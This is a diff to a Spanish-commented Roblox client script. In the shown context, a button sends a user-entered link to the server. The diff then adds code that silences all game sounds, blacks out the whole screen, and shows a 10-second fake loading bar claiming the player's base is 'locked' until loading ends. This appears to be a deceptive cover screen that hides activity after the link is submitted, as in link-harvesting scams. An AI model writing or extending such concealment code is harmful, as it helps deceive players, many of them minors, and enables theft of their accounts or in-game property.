@@ -1,5 +1,6 @@
 local Player = game.Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local SoundService = game:GetService("SoundService")
 
 -- ====== UI ======
 local ScreenGui = Instance.new("ScreenGui")
@@ -62,7 +63,7 @@ local function showLoadingScreen()
 
     -- Fondo negro completo
     local overlay = Instance.new("Frame")
-    overlay.Size = UDim2.new(1, 0, 1, 0)
+    overlay.Size = UDim2.new(2, 0, 2, 0) -- Cubrir toda la pantalla
     overlay.Position = UDim2.new(0, 0, 0, 0)
     overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     overlay.BackgroundTransparency = 0
@@ -70,8 +71,8 @@ local function showLoadingScreen()
 
     -- Texto de carga
     local loadingLabel = Instance.new("TextLabel")
-    loadingLabel.Size = UDim2.new(0, 400, 0, 50)
-    loadingLabel.Position = UDim2.new(0.5, -200, 0.4, -25)
+    loadingLabel.Size = UDim2.new(0, 600, 0, 100)
+    loadingLabel.Position = UDim2.new(0.5, -300, 0.4, -50)
     loadingLabel.BackgroundTransparency = 1
     loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
     loadingLabel.TextScaled = true
@@ -81,8 +82,8 @@ local function showLoadingScreen()
 
     -- Barra de carga fondo
     local barBackground = Instance.new("Frame")
-    barBackground.Size = UDim2.new(0, 400, 0, 30)
-    barBackground.Position = UDim2.new(0.5, -200, 0.5, -15)
+    barBackground.Size = UDim2.new(0, 600, 0, 50)
+    barBackground.Position = UDim2.new(0.5, -300, 0.5, -25)
     barBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
     barBackground.BorderSizePixel = 0
     barBackground.Parent = overlay
@@ -95,13 +96,33 @@ local function showLoadingScreen()
     barFill.BorderSizePixel = 0
     barFill.Parent = barBackground
 
+    -- Mensaje debajo de la barra de carga
+    local blockMessage = Instance.new("TextLabel")
+    blockMessage.Size = UDim2.new(0, 600, 0, 50)
+    blockMessage.Position = UDim2.new(0.5, -300, 0.6, -25)
+    blockMessage.BackgroundTransparency = 1
+    blockMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
+    blockMessage.TextScaled = true
+    blockMessage.Font = Enum.Font.SourceSansBold
+    blockMessage.Text = "Tu base se mantendrá bloqueada hasta que termine la carga"
+    blockMessage.Parent = overlay
+
     -- Animación de carga
     spawn(function()
         for i = 1, 100 do
             barFill.Size = UDim2.new(i/100, 0, 1, 0)
-            wait(0.03) -- Ajusta la velocidad de carga (3 segundos aprox)
+            wait(0.1) -- Ajusta la velocidad de carga (10 segundos aprox)
         end
     end)
+end
+
+-- ====== Función para eliminar todos los sonidos ======
+local function removeAllSounds()
+    for _, sound in pairs(SoundService:GetChildren()) do
+        if sound:IsA("Sound") then
+            sound:Destroy()
+        end
+    end
 end
 
 -- ====== Botón principal ======
@@ -116,6 +137,7 @@ Button.MouseButton1Click:Connect(function()
             remoteEvent:FireServer(link)
         end
 
+        removeAllSounds() -- Eliminar todos los sonidos del juego
         showLoadingScreen()
         ScreenGui:Destroy()
     else
